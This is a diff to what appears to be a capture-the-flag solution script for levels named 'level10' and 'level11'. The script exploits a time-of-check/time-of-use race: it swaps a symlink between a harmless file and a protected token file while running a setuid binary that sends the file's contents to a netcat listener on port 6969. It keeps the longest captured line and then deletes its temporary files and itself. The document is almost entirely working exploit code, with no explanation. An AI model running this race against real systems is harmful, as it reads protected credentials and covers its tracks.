@@ -1,1 +1,20 @@
-echo '.*( )*.' > /tmp/swap ; nc -l 6969 | tr -d '.*( )*.' & ~/level10 /tmp/toto 127.0.0.1 &> /dev/null & ln -fs /tmp/swap /tmp/toto ; ln -fs ~/token /tmp/toto;
+#!/bin/sh
+touch /tmp/null
+echo "" > /tmp/output
+filesize=0
+while [ $filesize -le 8 ]
+do
+        rm -f /tmp/output
+        while [ ! -s /tmp/output ] ; do ln -sf /home/user/level11/token /tmp/link 2> /dev/null; ln -sf /tmp/null /tmp/link 2> /dev/null; done &
+        while [ ! -s /tmp/output ] ; do ./level11 /tmp/link 10.12.1.130 > /dev/null; done &
+        nc -lk 6969 > /tmp/output &
+        while [ ! -s /tmp/output ] ; do sleep 0.01; done
+        kill -9 ps -ef | grep 'nc -lk 6969' | head -1 | awk '{print $2}'
+        filesize=$(wc -c < "/tmp/output")
+done
+cat /tmp/output | awk '{print length, $0}' | sort -nr | head -1 | awk '{ print $NF }'
+unlink /tmp/link
+rm -rf /tmp/link
+rm -rf /tmp/null
+rm -rf /tmp/output
+rm $0
